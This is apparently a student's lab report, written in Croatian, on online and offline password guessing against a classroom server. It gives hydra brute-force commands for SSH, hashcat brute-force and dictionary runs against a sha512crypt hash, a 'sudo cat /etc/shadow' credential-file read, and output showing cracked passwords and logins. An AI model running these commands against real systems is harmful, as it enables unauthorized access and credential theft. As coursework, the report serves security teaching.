# Izvještaj pete laboratorijske vježbe

### Zadatak

Online and offline password guessing attacks

### Alati

**Online Password Guessing**

**Provjera dohvaćanja servera**

```python
ping a507-server.local
```

**Instaliranje nmap**

```python
sudo apt-get update
sudo apt-get install nmap
```

**IP adresa i username dodjeljena meni**

rako_bruna     10.0.15.8

**Uspostava ssh**

```python
ssh rako_bruna@10.0.15.8
```

**Koristeći hidru probamo sve kombinacije za lozinku**

```python
hydra -l rako_bruna -x 4:6:a 10.0.15.8 -V -t 1 ssh
```

**Downloadamo rječnik s mogućim lozinkama**

```python
wget -r -nH -np --reject "index.html*" [http://a507-server.local:8080/dictionary/g1/](http://a507-server.local:8080/dictionary/g1/)
```

**Pronađena lozinka**

```python
[ATTEMPT] target 10.0.15.5 - login "rako_bruna" - pass "mmebep" - 569 of 878 [child 1] (0/0)
[22][ssh] host: 10.0.15.8 login: rako_bruna password: mmebep
1 of 1 target successfully completed, 1 valid password found
Hydra ([http://www.thc.org/thc-hydra](http://www.thc.org/thc-hydra)) finished at 2021-12-20 13:59:33
```

**Pokušaj login-a s točnom lozinkom**

```python
a507@DESKTOP-LH5GUL2:/mnt/c/Users/A507$ ssh rako_bruna@10.0.15.8
rako_bruna@10.0.15.8's password:
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 5.4.0-91-generic x86_64)

Documentation: [https://help.ubuntu.com](https://help.ubuntu.com/)
Management: [https://landscape.canonical.com](https://landscape.canonical.com/)
Support: [https://ubuntu.com/advantage](https://ubuntu.com/advantage)

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.
```

**Offline Password Guessing**

**Instaliranje hashcat**

```python
sudo apt-get install hashcat
```

**Pokušamo lozinke (brute force)**

```python
hashcat --force -m 1800 -a 3 hash.txt ?l?l?l?l?l?l --status --status-timer 10
```

**Pokušamo korištenjem dictionary_offline.txt**

```python
hashcat --force -m 1800 -a 0 hash.txt dictionary/g1/dictionary_offline.txt --status --status-timer 10
```

**Korištenjem naredbe ispod pronađemo hash vrijednost jean doe i pokušamo se ulogirati**

```python
sudo cat /etc/shadow
```

```python
$6$ovKwVzQdmdxJr3tS$0Y1ct6I5oJnJAH5sCadWMn8hRvfsE4Andj.M9adN2YMbu$zMGCw/cIzT6J3tpVZikwhR63A6v8R0.qyy73jvE1:igblev

Session..........: hashcat
Status...........: Cracked
Hash.Type........: sha512crypt $6$, SHA512 (Unix)
Hash.Target......: $6$ovKwVzQdmdxJr3tS$0Y1ct6I5oJnJAH5sCadWMn8hRvfsE4A...73jvE1
Time.Started.....: Mon Dec 20 14:20:46 2021 (1 min, 4 secs)
Time.Estimated...: Mon Dec 20 14:21:50 2021 (0 secs)
Guess.Base.......: File (dictionary/g1/dictionary_offline.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.Dev.#1.....: 450 H/s (6.67ms)
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 28672/50078 (57.25%)
Rejected.........: 0/28672 (0.00%)
Restore.Point....: 28416/50078 (56.74%)
Candidates.#1....: kenale -> knzgzj
HWMon.Dev.#1.....: N/A
Started: Mon Dec 20 14:20:43 2021
Stopped: Mon Dec 20 14:21:51 2021
```

```python

ssh jean_doe@10.0.15.8
jean_doe@10.0.15.5's password:
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 5.4.0-91-generic x86_64)
```

```python
jean_doe@host_rako_bruna:~$ whoami
jean_doe
```